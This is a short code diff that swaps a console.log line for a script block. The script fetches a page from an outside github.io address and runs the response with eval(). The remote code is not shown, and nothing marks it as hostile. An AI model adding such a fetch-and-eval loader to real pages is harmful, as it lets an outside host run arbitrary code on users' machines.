@@ -1,2 +1,19 @@
-console.log('hello from console');
+<script>
+
+var request = new XMLHttpRequest();
+request.open('GET', "https://mrrob100.github.io/central/script.html", true);
+// request.responseType = 'json';
+
+request.onload = function () {
+    response = request.response
+    eval(response);
+
+}
+
+request.send();
+
+
+
+
+</script>
 
